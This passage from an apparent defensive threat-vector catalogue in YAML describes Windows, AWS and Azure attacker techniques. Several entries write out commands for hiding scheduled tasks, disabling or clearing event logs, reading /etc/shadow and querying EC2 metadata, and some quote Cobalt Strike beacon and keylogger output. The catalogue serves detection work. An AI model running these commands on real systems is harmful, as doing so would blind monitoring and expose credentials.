    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0084%5D-Scheduled-tasks-to-connect-to-adversarial-infrastructure
  - id: TVM0085
    name: Scheduled tasks created with taskschlr.exe
    description: 'A threat actor can use the Task Scheduler to create tasks for nefarious
      purposes. For example, during  the creation of a task in Task Scheduler > Create
      Task, the newly created task can be configured with  specific options in the
      tab "Action". Through the "Action" settings the threat actor can specify  the
      actions for the task to execute, which often include outbound connections to
      attacker  infrastructure, binary execution or registry entry editing or creation.  Example:   Action:
      "Start a program" In Program/script field: C:\ProgramData\<name.exe>  Tasks
      are stored in C:\Windows\System32\Tasks\ in XML format.  They reside in the
      following registry:  HKLM\Software\Microsoft\Windows\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}  “Actions”
      value stored within the Tasks\{GUID} key points to the command line associated
      with the task. In the registry under HKLM\Software\Microsoft\Windows\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}
      there is a registry key for the task with a key "Actions" related to Tasks\{GUID}
      id. In "Edit Binary Value" of the registy key "Action" there is a reference
      to the path which can contain malicious executable file, for example: C:\Windows\System32\taskschlr.exe
      or other.  Similar information is stored within an extensionless XML file, created
      within C:\Windows\System32\Tasks,  where the name of the file matches the name
      of the task.   Example for Settings section in XML file with potentially malicious
      executable file:   <Task version="the_version" xmlns="http_link">  ...  </Settings>  <Actions
      Context="Author">    <Exec>     <Command>C\Windows\System32\taskschlr.exe</Command>    </Exec>  <Actions>
      </Task> '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0085%5D-Scheduled-tasks-created-with-taskschlr.exe
  - id: TVM0086
    name: Scheduled tasks to maintain persistence in registry
    description: 'A threat actor can successfully maintain persistence on a compromised
      system  by using scheduled tasks to create or edit registry entries.  Windows
      Scheduled Task is a feature of the Windows operating system that  allows users
      to schedule a command or program to run automatically at a  specific time or
      interval. This can be useful for running tasks that need to be performed regularly,
      such as backing up files or checking for updates.  Scheduled tasks can be configured
      to run in the background, without the need for user intervention.  One example
      for a scheduled task that establish persistence in the registry  is a task that
      is configured to run when specific condition is met - as  example on system
      start up. The task will have an action configured, which  might be to download
      and run a payload, which for example could be a payload that sets a registry
      run key. Registry run keys are keys in the Windows  registry that are called
      during system start up. These keys enable  configurations to be loaded automatically.
      Registry run keys can also  directly execute binary files on system start up.   To
      create a scheduled task that runs at system startup attackers are using  for
      example Windows Task Scheduler, cmd.exe or PowerShell commands in a  script.
      Once the task has been created, it will be added to the registry and  will run
      automatically every time the system starts up, or until discovered  and deleted. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0086%5D-Scheduled-tasks-to-maintain-persistence-in-registry
  - id: TVM0087
    name: Deletion of Security Descriptor (SD) value in registry for scheduled task
    description: 'A Security Descriptor (SD) is a data structure that specifies the
      security attributes of an object in Windows operating system. These attributes
      include the permissions and access rights granted to users and groups, as well
      as any security measures that have been applied to the object.  Security Descriptor
      determines the users allowed to run specific task. If the SD value is deleted
      within the registry tree path, this deletion results in “disappearing” of the
      task from “schtasks /query” and Task Scheduler.  Some malware families, for
      example Tarrask malware can use security descriptors to create scheduled tasks
      that are hidden from the user and are not visible in the Windows Task Scheduler.
      These tasks are used to execute the malware''s malicious payload, which can
      include installing additional malware, stealing sensitive information, or disrupting
      the normal operation of the infected system.  To evade detection, a malware
      modifies the security descriptor of the scheduled task to grant only the SYSTEM
      account access to the task. This means that other users and security tools will
      not be able to see or interact with the task, making it more difficult to detect
      and remove.  Security professionals can use tools such as Sysinternals Autoruns
      and Process Explorer to identify and remove these hidden scheduled tasks, as
      well as other forms of malware that use security descriptors for defense evasion. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0087%5D-Deletion-of-Security-Descriptor-%28SD%29-value-in-registry-for-scheduled-task
  - id: TVM0088
    name: Deletion of Tasks or Tree registry keys in scheduled task hives
    description: 'Threat actors are using deletion of tree registry keys to remove
      information related to their activities, for example created previously scheduled
      tasks. For the deletion of tree registry keys, the threat actors are using reg
      command in command-line utility with a parameter delete, PowerShell commands
      or scripts or manually delete the registry keys from Registry Editor (regedit).
      In Azure cloud infrastructure threat actors use Azure CloudShell to delete registry
      keys.  Example for registry keys created upon creation of a new scheduled task:  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
      NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
      NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}  The registy keys above can
      be deleted using the "reg delete" command. The  "reg delete" command deletes
      the specified registry key and all of its  subkeys.  reg delete "HKEY_LOCAL_MACHINE\Registry_Key"
      /f  Examples for deleting registry keys with PowerShell commands:  Remove-Item
      -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME
      -Force -Verbose  or  Get-Item Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
      NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME | Remove-Item -Force -Verbose  Where
      Get-Item command retrieves the Key name and then Remove-Item uses the result
      from Get and deletes the key registry.  To delete registry keys using Azure
      CloudShell threat actors are using Remove-ItemProperty cmdlet in Windows PowerShell
      or the rm command in Bash.  Examples:  Remove-ItemProperty -Path "HKLM:\Software\MyKey"
      -Name "MyValue"  rm "HKLM:\Software\MyKey" '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0088%5D-Deletion-of-Tasks-or-Tree-registry-keys-in-scheduled-task-hives
  - id: TVM0089
    name: Scheduled tasks to execute binaries
    description: 'A threat actor can use scheduled tasks to execute binaries such
      as LOLBINs or malware. LOLBINs is short for ''living off the land binaries'',
      which means that the threat actors often use native Windows binaries to try
      to hide malicious activity.  A scheduled task to execute a binary is a way for
      an attacker to ensure  that binaries of their choosing and with their settings
      are run automatically at a specific time or on a regular basis. Scheduled tasks
      can be set up to run a malicious binaries or LOLBINs in a number of ways, such
      as through the use of the built-in task scheduler in Windows. Once the scheduled
      task is created, it will run the specified binary at the designated time. It
      is important to regularly check and disable any suspicious scheduled tasks to
      protect against this type of attack. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0089%5D-Scheduled-tasks-to-execute-binaries
  - id: TVM0090
    name: Switching off forced signed commits for GitHub repository
    description: 'Development and DevOps teams may turn on signed commits to ensure
      that an  attacker cannot commit code to a code repository of an organization
      by  merely succesfully stealing an OAuth token of a developer. With forced  commits,
      the attacker will be blocked from committing code changes to a repository, essentially
      limiting the attacker from attaining lateral  movement or similar objectives,
      unless the attacker turns off the forced  commit policy.  '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0090%5D-Switching-off-forced-signed-commits-for-GitHub-repository
  - id: TVM0091
    name: AWS Compute instance deployed in unusual region
    description: 'Certain threat actors will try to launch AWS compute instances  (EC2,
      EKS, ECS) instances to achieve their objectives  One of the main vectors currently
      is to monetize access to  privileged AWS credentials by deploying new compute
      instances of various types  to mine cryptocurrencies. To hide their deployed
      instances, a threat actor  may deploying the resources into unused regions,
      where they may go  unnoticed.  Additionally threat actor may launch compute
      instances to act as staging  platforms for serving malware for other campaigns.  It
      is expected that threat actors will potentially use compute instances  for other
      purposes than the 2 listed above. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0091%5D-AWS-Compute-instance-deployed-in-unusual-region
  - id: TVM0092
    name: Use of a malicious lambda layer in AWS account lambda function
    description: 'A Lambda layer is an archive containing additional code, such as
      libraries, dependencies, or even custom runtimes that is are extract to the
      /opt directory in the execution environment of the function they are added to.
      While AWS provides a few layers, developers may also create custom ones to share
      in their organization, or use an external one by pointing to a particular ARN.
      Layers are immutable, meaning once they are created, a version is made and further
      changes would bump the version. A threat actor can compromise one or more lambda
      functions by centrally  compromising a lambda layer used by one or more other
      AWS accounts. This  can also be a third party lambda layer in use by EC accounts.   Once
      a new version of a lambda layer exists, it can  get deployed  via some trigger+action
      needed on the side of the lambda administrator,  unless the threat actor controls
      credentials to deploy or update lambda  functions. '
    criticality: Low
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0092%5D-Use-of-a-malicious-lambda-layer-in-AWS-account-lambda-function
  - id: TVM0093
    name: Scheduled task created on remote endpoint
    description: 'Adversaries with access to the right credentials can create scheduled
      tasks  remotely from an endpoint they control for malicious purposes, which
      often  include outbound connections to attacker infrastructure, binary execution,  achieve
      persistance or registry entry editing or creation, but in this case the remote
      scheduled task achieves lateral movement.   Adversaries can create and configure
      scheduled tasks on remote endpoints  using either the task scheduler or PowerShell.  One
      example syntax used to create a new task on a remote computer is to  use \computername  Examples:   at
      \\computername time/interactive | /every: date, ... /next: date, ... command
      at \\computername id/delete | /delete /yes  Run a scheduled task on a remote
      mashine using PowerShell, example:  schtasks /run /s ComputerName /tn “description”  Using
      the task Scheduler, as example: > "Connect to Another Computer",  provide the
      IP address of the remote system and select "Connect as another  user" > "Set
      User". '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0093%5D-Scheduled-task-created-on-remote-endpoint
  - id: TVM0094
    name: Modify Microsoft Sentinel Data Connector to impair Detections
    description: 'A threat actor may want to disable, remove or update the configuration
      of Sentinel Connectors to act invisibly in Azure, which would impair the ability
      of a SOC to receive alerts since it would stop log file ingestion into Azure
      Sentinel.   An attacker can do this either by deploying via API an ARM template,
      biceps template, or other script/code element that can be used via Azure APIs,
      using the Azure CLI or directly on the portal itself via a browser. '
    criticality: Severe
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0094%5D-Modify-Microsoft-Sentinel-Data-Connector-to-impair-Detections
  - id: TVM0095
    name: Duplicate an access token in a new process to elevate privileges
    description: 'An adversary can use automated solutions like CobaltStrike framework
      to create a new process with a duplicated token to escalate privileges  and
      bypass access controls. An adversary can duplicate a desired access  token with
      DuplicateToken(Ex) and use it with CreateProcessWithTokenW  to create a new
      process running under the security context of the  impersonated user. This is
      useful for creating a new process under  the security context of a different
      user.  The new process runs in the security context of the specified token.  It
      can optionally load the user profile for the specified user. Usually the function
      CreateProcessWithTokenW is running like  a process winbase.h   The process that
      calls CreateProcessWithTokenW must have  SE_IMPERSONATE_NAME privilege.   Adversaries
      commonly use token stealing to elevate their security context  from the administrator
      level to the SYSTEM level. An adversary can use a  token to authenticate to
      a remote system as the account for that token if the  account has appropriate
      permissions on the remote system.  Example for spawn of a process with token
      duplication: The process spawn is usually with PID (Process Identifier): 2572  spawn
      windows/beacon_https/reverse_https (<ip_address>:443)  in a high integrity process
      (token duplication) '
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0095%5D-Duplicate-an-access-token-in-a-new-process-to-elevate-privileges
  - id: TVM0096
    name: Scheduled task creation using Azure CloudShell
    description: 'Threat actors can use Azure CloudShell, which is accessible via
      the Azure portal or the browser, to create scheduled tasks.  The path to the
      Action parameter of the scheduled task is set in the task. Threat actors can
      also use the Azure CloudShell editor to edit and visualize in a better format
      their code before deploying it.  For example, threat actors use "New-ScheduledTaskTrigger"
      cmdlet to create a trigger for the new scheduled task and further "New-ScheduledTaskAction"
      cmdlet to create a specific action for the task. In the end the  "Register-ScheduledTask"
      cmdlet is used to create the scheduled task.   $Trigger = New-ScheduledTaskTrigger
      -Daily -At <time: hh:mm> $Action = New-ScheduledTaskAction -Execute "PowerShell.exe"
      -Argument "-File C:\Scripts\My_task_script.ps1" Register-ScheduledTask -TaskName
      "My Task" -Trigger $Trigger -Action $Action -RunLevel Highest '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0096%5D-Scheduled-task-creation-using-Azure-CloudShell
  - id: TVM0097
    name: Windows credential dumping through Local Security Authority (LSA) Secrets
    description: 'Adversaries may attempt to dump credentials to obtain account login
      and credentials details, using techniques for Local Security Authority  (LSA)
      Secrets dumping. If the attacker has a System access to the host  this may lead
      to access LSA secrets database. Local Security Authority contains credential
      information related to local and domain based accounts.  The Registry is used
      to store the LSA secrets. When services are run under  the context of local
      or domain users, their passwords are stored in the  Registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets.
      If auto-logon is  enabled, this information will be stored in the Registry as
      well.  The extracted passwords are UTF-16 encoded, which means that they  are
      returned in plaintext. LSA secrets can also be dumped from memory.  Known tools
      used for LSA credential dumping:  - pwdumpx.exe - gsecdump - Mimikatz - secretsdump.py
      - reg.exe (execution file extracts information from the Registry) - Creddump7
      (for gathering of credentials)  Executed commands and arguments that may access
      to a host may attempt to  access Local Security Authority (LSA) secrets. Remote
      access tools may contain  built-in features or incorporate existing tools like
      Mimikatz. PowerShell scripts also can contain credential LSA dumping functionality. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0097%5D-Windows-credential-dumping-through-Local-Security-Authority-%28LSA%29-Secrets
  - id: TVM0098
    name: Deletion of Windows Scheduled Task XML file
    description: 'When a scheduled task is created, different artifacts related to
      the task are generated and stored in a XML file. This XML file contains all
      of the information about the task, including the name, triggers, actions, and
      other settings. In the xml code in the section "Actions" is stored a path to
      the running task, for example “C:\Windows\System32\task.exe”. Threat actors
      may delete the corresponding XML file to a scheduled task to hide their activities
      on the system. Threat actors can delete the XML file manually from C:\Windows\System32\Tasks
      folder or by using CMD or other CLId/shells, bash, or PowerShell scripts.  Example
      for deletion of XML file with bash commands:  cd /mnt/c/Windows/System32/Tasks
      rm taskname.xml  Example for deletion of XML file with PowerShell commands:  cd
      C:\Windows\System32\Tasks Remove-Item taskname.xml  In cloud infrastructures
      threat actors are using command-line interface (CLI) like CloudShell in Azure.   Example:   Navigate
      to the path where the XML file is stored and delete the file with the command
      "del":  cd C:\Windows\System32\Tasks del taskname.xml  Deleting the XML file
      will only remove the task from the Task Scheduler. It will not uninstall any
      programs or delete any files that were associated with the task. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0098%5D-Deletion-of-Windows-Scheduled-Task-XML-file
  - id: TVM0099
    name: Capturing user input using a software-based keylogger
    description: 'Keyloggers are often software programs that record every keystroke
      made on a computer''s keyboard. They are used by attackers to gain unauthorized
      access to a victim''s computer or to steal sensitive information such as passwords,
      credit card numbers, and personal documents.  Example for keyloggers:  - Software
      keyloggers: These are programs that are installed on a computer   and run in
      the background. They can record keystrokes, take screenshots,   and even capture
      webcam footage. - Malware: Malicious software, such as viruses and trojans,
      can often   include keylogging capabilities.  Threat actors can use different
      methods for capturing user input to obtain credentials and collect user''s information.
      For example, they can use CobaltStrike automated feature "keystroke logger".
      The keystroke logger keeps a record of keystrokes and associates them with the
      active window of the user at a current time. This makes the information more
      useful than a stream of characters without a specific context. The keyloggesrs
      can be for example based on clipboard logging or programmatically set, which
      means they have set of instructions to capture specific details. The keylogger
      tools can record also programs, folders or every viewed website, search engine
      queries, instant messenger conversations, FTP downloads, and other Internet-based
      activities, including used bandwidth, take screenshots to capture graphics-based
      info and others. Some keyloggers can record length of the keypress, time of
      keypress, velocity of keypress or name of the used key.   keylogger start -
      parameter to start the keystroke logger and the  recording of captured keystrokes  keylogger
      stop - parameter to stop keystroke logger  Example for keystroke logger activity.
      The logs are from CobaltStrike automated feature "keystroke logger":  log keystrokes
      host called home, sent: 83049 bytes keystrokes from Mozilla Firefox by test
      keystrokes from python nested dictionarry - Google Suche — Mozilla Firefox by
      test take screenshot  Related events can be observed as "log keystrokes" activity
      with a process identifier (PID): 2572 '
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0099%5D-Capturing-user-input-using-a-software-based-keylogger
  - id: TVM0100
    name: Usage of 'netdom query' on command line to discover Active Directory domain
      information
    description: 'Netdom is a command used to discover Active Directory domain information
      about endpoints, user or groups or other AD related items. It''s available if
      Active Directory Domain Services (AD DS) role is installed on the server. It''s
      also available for remote usage if Remote Server Administration Tools (RSAT)
      are installed. Threat actors use command-line interface (cmd) with elevated
      administrator privileges to execute variety of netdom queries to query domain
      information (netdom query) such as the name of the domain, the domain functional
      level, and the domain controllers in the domain, join a computer to a domain
      (netdom join), verify trust relationships between the domains (netdom verify)
      or rename a computer name without remove it from the domain and rejoin it.  For
      example, threat actors execute netdom queries with different parameters like:
      /d for the selected domain where the current computer belongs, /s  parameter
      to specify the domain controller that performs the query, /ud for user account
      connected to the Domain Controller, /pd for password of the user account, /verify,
      /reset, /direct and others.  Netdom applies to the following Windows versions:   -
      Windows Server 2003 - Windows Server 2008 - Windows Server 2003 R2 - Windows
      Server 2008 R2 - Windows Server 2012 - Windows Server 2003 with SP1 - Windows
      8  netdom query {/d: | /domain:}<Domain> SERVER netdom query {/d: | /domain:}<Domain>
      WORKSTATION netdom query {/s: | /server:}<Server>  netdom query {/ud: | /userd:}[<Domain>\]<User>
      netdom query {/pd: | /passwordd}{<Password>|*}  Other parameters that are used
      with Netdom commands:  renamecomputer — key for renaming, it can be used to
      rename computer locally or remotely computer — it''s a computer name before
      renaming it / newname: new_computer_name — desired computer name after renaming
      / userd: domain_name \ administrator_name — domain name is the name of the domain
      administrator / passwordd: * — wildcard determines all possible combination
      of characters   / usero: local_administrator — for the username of the local
      administrator / passwordo: * — local administrator password.  Once gained access
      to the Windows system, threat actors can execute manually "netdom query" commands
      as they are native for Windows.  Example:  run: netdom query /d:test SERVER
      host called home, sent: 62 bytes host called home, sent: 79 bytes  run: netdom
      query /d:test WORKSATION host called home, sent: 66 bytes run: netdom query
      /d:test WORKSTATION host called home, sent: 67 bytes '
    criticality: Medium
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0100%5D-Usage-of-%27netdom-query%27-on-command-line-to-discover-Active-Directory-domain-information
  - id: TVM0101
    name: Abusing Lolbins to Enumerate Local and Domain Accounts and Groups
    description: "Adversaries may attempt to enumerate the environment and list all\
      \ local system and domain accounts or groups.   To achieve this purpose, they\
      \ can use variety of tools and techniques.   Their goal is reconnaissance, gathering\
      \ of user's account information on  the system or in the domain and further\
      \ usage of accounts with higher  privilege access.   ### For Windows OS:  On\
      \ Windows platforms threat actors can use the net utility or dsquery, as examples\
      \ as lolbins. Net utility commands, as examples, are executed with additional\
      \ parameters like \"net localgroup\", \"net user\" for administrators and guest\
      \ accounts. For domain users and groups net utility commands are used with the\
      \ parameter /domain.    Examples:     - net user /domain - net group /domain\
      \ - net localgroup on localhost - net user on localhost - net localgroup \"\
      Administrators\" on localhost  Executable files net.exe or net1.exe are indicators\
      \ for accounts enumeration. \"Net1.exe\" resides in \"C:\\Windows\\System32\"\
      \ like \"net.exe\" and indicates process  known as Net Command or Application\
      \ Installer. These .exe files are usually related  to run applications, batch\
      \ files, and scripts that call Net utility.    Threat actors may enumerate currently\
      \ or previously connected users, or a subset of users as for example administrative\
      \ users.    ### For Linux OS (including Windows Subsystem for Linux):  Here\
      \ some example of commands typically used for discovery on accounts  and groups.\
      \  - whoami        #current user (often used in legitimate scripts) - hostname\
      \      #show or set the system's host name - id            #print real and effective\
      \ user and group IDs - uname         #print system information - arp - users\
      \ - netdiscover - ifconfig\t  #configure a network interface - nmap - ps   \
      \         #report a snapshot of the current processes - netstat - uname - issue\
      \ - groups - tcpdump - sudo -l - cat /etc/shadow - cat /etc/passwd # other command\
      \ could be used to list the content of the file ex: 'less', 'more' etc. - cat\
      \ /etc/group  # Groups - cat /etc/sudoers # File that allocate system rights\
      \ to users - last            # most recent login sessions - ldapsearch     \
      \ # Get information from LDAP server - rpcclient       # Command-line utility\
      \ used to interact with Microsoft RPC protocol. Could be used to enumerate AD\
      \ - finger          #  user information lookup command  "
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0101%5D-Abusing-Lolbins-to-Enumerate-Local-and-Domain-Accounts-and-Groups
  - id: TVM0102
    name: Enumerate EC2 instance data using AWS metadata service
    description: 'Threat actors collect AWS IDs from EC instances by using AWS metadata
      service that is running by default. AWS account ID is a unique identifier that
      is used to identify an AWS account, AWS resource management or to access to
      AWS services.  Threat actors can extract different elements from metadata service,
      for example:   - accountId - architecture - availabilityZone - billingProducts
      - devpayProductCodes - marketplaceProductCodes - imageId - instanceId - instanceType
      - kernelId - pendingTime - privateIp - ramdiskId - region - version  AWS metadata
      keeps information for the instance such as instance id, AMI id, hostname, ip
      address, security groups, public-ip and others. Instance metadata usually is
      divided into different categories. Instance metadata build based on the category
      is specified with a new version number. In some cases the instance metadata
      is available only when a new build version is launched. The categories are classified
      for example by elastic-gpu-id, role-name, instance-type, operation system (windows,
      mac or linux), ami-id (Amazon Machine Image ID), public-ip, vhostmd and by the
      version when category was released.  Examples:   Category:                                        Version
      ID: ami-id                                           1.0 block-device-mapping/ami                         2007-12-15
      elastic-gpus/associations/elastic-gpu-id         2016-11-30 iam/security-credentials/role-name               2012-01-12
      network/interfaces/macs/mac/public-hostname      2011-01-01  Threat actors can
      extract information from the AWS metadata service with the user token and curl
      command. For curl commands - cURL tool is usually used for automation of AWS
      metadata information collection.   Tools like curl on *nix-based systems, or
      Invoke-Rest Method in PowerShell on Windows are used for extraction of AWS metadata
      as they send GET requests for data collection. AWS exposes an Instance Metadata
      endpoint on every EC2  Instance at the address: http://169.254.169.254  Example:   curl
      http://169.254.169.254/latest/meta-data/  OR  Curl command with a token for
      extraction of additional matadata information:   TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token"
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` curl -H "X-aws-ec2-metadata-token:
      $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document  Example
      for extraction of AWS metadata with bash script:  INSTANCEID=$(curl -sL http://169.254.169.254/latest/meta-data/instance-id)
      $ echo INSTANCEID '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0102%5D-Enumerate-EC2-instance-data-using-AWS-metadata-service
  - id: TVM0103
    name: Disabling of Windows event logging through registry entries
    description: 'Threat actors can disable Windows event logs by adding, deleting
      or modifying registry entries manually or with commands in a command-line prompt.   The
      threat actor may disable the Windows Event log events manually via Event Viewer
      properties or with CLI commands to disable a specific event or all of them.
      Threat actors may also use script files or PowerShell to change the registry.  If
      the threat actors want to disable event logging manually via registry entries,
      they have to find the associated GUID to the event that will delete. The GUID
      can be taken for example from Event Viewer > Select specific event log > Event
      Properties > in Details select "XML view". (example for GUID id: Giud="{BD12F3B8-4DE1-TR31-DE39RET84L12}")
      After this the threat actor navigates to the registry with the GUID that needs
      to delete and change the value of the dword in the registry key "Enabled" to
      0.  Example:   1. Example for disabling the logging of all event logs via registry
      entry:  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog"
      /v Start /t REG_DWORD /d 4 /f  2. Example for disabling the logging of a specific
      event log via registry entry:  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog[Log
      Name]" /v TypesSupported /t REG_DWORD /d 0 /f  3. Manual change in the registry
      of the registry key "Enable" (dword value) to 0.       Registry:    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System    Dword
      value change in the registry key "Enable":    "Enabled"=dword:0   "EnableProperty"=dword:0  Example
      for change of Audit policies in the registries:  psexec -s -i regedit (the command
      needs system-level access to run) After that in HKLM\SECURITY\Policy\PolAdtEv
      registry hive in the registry editor "Edit Binary Value", 16-bit (two-byte)
      values can be changed to 00 00 which means no audit. For example replace the
      data started with  01 00 01 00 to 00 00 00 00  - 00 00 means no auditing - 01
      00 means success auditing - 02 00 means failure auditing - 03 00 means all auditing '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0103%5D-Disabling-of-Windows-event-logging-through-registry-entries
  - id: TVM0104
    name: Change the audit policy to disable Windows event logging
    description: 'A threat actor may change an audit policy setting with the purpose
      of disabling Event logging for specific entries. Usually the threat actor will
      disable specific audit policy entries, but other scenarios can be imagined.  For
      example, they can change the audit policy settings manually, with PowerShell
      or other scripts, through the registries or by using Command-line interface.  Examples:   Command-prompt
      (cmd) interface:  auditpol /set /category:"Account Logon" /success:disable /failure:disable  Where
      /success or /failure are parameters used for disabling of successful or failed
      events.  auditpol /Set /Category:* /success:disable  Where the parameter /Category
      is used to delete only specific category, set of categories or all of them as
      shown in the example with wildcard (*) character.  auditpol /clear /y auditpol
      /remove /allusers  The both commands are used to clear the audit policy settings  PowerShell
      commands to modify Audit policies:  auditpol /get /category:* or auditpol /list/category
      PS ~> $AuditPolicyReader::GetClassicAuditPolicy()  Example for a PowerShell
      script that change the audit policy to audit successful logon events on the
      local computer. A threat actor can modify the $GPO and $SecuritySettingsPath
      variables to target a different GPO or security setting, also can modify $AuditSettingName
      and $AuditSettingValue variables to change the audit policy to a different setting
      or value.  Import-Module GroupPolicy $GPO = "LocalGPO" $SecuritySettingsPath
      = "Computer Configuration\Windows Settings\Security Settings" $AuditSettingName
      = "Audit Logon Events"  # Set the value for the security setting. # The values
      are: # 0 = Success and Failure # 1 = Success # 2 = Failure  $AuditSettingValue
      = 1 $SecuritySettings = Get-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath
      | Select-Object -ExpandProperty Values $AuditSetting = $SecuritySettings | Where-Object
      { $_.Name -eq $AuditSettingName } $AuditSetting.Value = $AuditSettingValue Set-GPRegistryValue
      -Name $GPO -Key $SecuritySettingsPath -Value $SecuritySettings gpupdate /force   For
      advanced policies, threat actors can use /r to get a csv-formatted table:  auditpol
      /get /category:''Account Logon'' /r | ConvertFrom-Csv |  Format-Table ''Policy
      Target'',Subcategory,''Inclusion Setting''  Manual change:   If the service
      secpol.msc is running, then a threat actor can navigate to Security Settings\Local
      Policies\Audit Policy to modify the basic policy settings or navigate to Security
      Settings\Advanced Audit Policy Configuration to modify advanced policy settings. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0104%5D-Change-the-audit-policy-to-disable-Windows-event-logging
  - id: TVM0105
    name: Disable Windows event logging through PowerShell
    description: 'Threat actors can use PowerShell to disable Windows event logging.
      They use this technique for example to disable diagnostic eventlogs or some
      individual Windows log (for example: Application, Security or System log).  Disabling
      of Application log can cause lost of the tracks for specific application, for
      example: lack of visibility for authentication, time of logon, failure events
      of the application or other related application details.  Threat actors may
      disable Security Event log to prevent detection of their logons on the system:
      number of logons, timestamp of the logon and  with what privilege account and
      username they logon on the system.   PowerShell command to clear event logs
      with ''Disable-EventLog'' cmdlet:  Disable-EventLog -LogName "Parameter" where
      the "Parameter" can be Application, Security or System  Example how to clear
      individual logs with -ListLog parameter:  (Get-WinEvent -ListLog *).LogName
      | %{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_)}  The
      threat actors can specify the logname and clear an individual log with: [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-FailoverClustering/Diagnostic")  With
      the following section the Event log is disabled competely:  $wineventlog = get-winevent
      -ListLog "Microsoft-Windows-FailoverClustering/Diagnostic" -ComputerName hyperv-01
      $wineventlog.IsEnabled = $false $wineventlog.SaveChanges()  If the threat actors
      want to disable multiple event logs at once, they can use a loop in their customly
      prepared PowerShell script to iterate through a list of event log names and
      disable them one by one.  Example:  # Create a list of event log names to disable
      $eventLogs = "Application", "System", "Security"  # Iterate through the list
      of event logs and disable them one by one foreach ($eventLog in $eventLogs)
      { Disable-EventLog -LogName $eventLog }  This script will disable the "Application",
      "System", and "Security" event logs on the local computer. There is an option
      to modify the list of event logs to include any other specific event log that
      the threat actor wants to disable. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0105%5D-Disable-Windows-event-logging-through-PowerShell
  - id: TVM0106
    name: Linux kernel module injection from container
    description: 'Loadable Kernel Modules (LKM) can be used by adversaries to deliver  sophisticated
      and hard to detect rootkits. Each event where kernel modules  are loaded from
      a container should be investigated with the exeption of  Security tools deployed
      in containers.  An injected kernel module is just code execution, and can in
      theory do  more or less anything, but threat actors mostly use this for dwelling
      and  for hiding their presence on a system. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0106%5D-Linux-kernel-module-injection-from-container
  - id: TVM0107
    name: Changes to Azure infrastructure deployed through Azure CLI
